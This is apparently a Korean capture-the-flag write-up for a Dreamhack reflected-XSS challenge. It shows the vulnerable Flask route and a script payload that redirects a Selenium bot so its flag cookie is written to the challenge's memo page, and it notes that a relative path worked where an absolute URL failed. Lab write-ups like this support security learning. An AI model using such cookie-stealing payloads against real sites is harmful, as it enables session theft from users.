### 문제 구조

`/flag`에 제출한 입력값을 Selenium이 `/vuln`에서 실행함. Selenium에는 flag 쿠키가 설정되어 있으며 해당 값을 알아내야함. 

취약점
``` python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```
- 사용자의 입력을 이스케이프하지 않고 HTML 응답으로 반환하므로 Reflected XSS가 발생함. 

### 나의 시도

이 스크립트로 `/vuln`에서 해당 스크립트를 실행해서 `/memo`에 쿠키 데이터를 적도록 시도함. 
``` html
<script>location.href = `http://host3.dreamhack.games:15272/memo?memo=${document.cookie}`</script>
```

그런데 계속 Selenium 브라우저에서 해당 location으로  에러가 났음. 그러다가 `/memo?memo=...`처럼 상대경로로 하니까 성공함. 


### 새로운 개념

- `127.0.0.1`은 자신의 컴퓨터 주소(서버 컴퓨터인 경우 서버의 IP 주소)
- 드림핵 서버에서 외부 공개 도메인으로의 접속을 막는 것 같음. 
- 상대경로로의 이동은 현재 페이지의 주소를 기준으로 이동함.
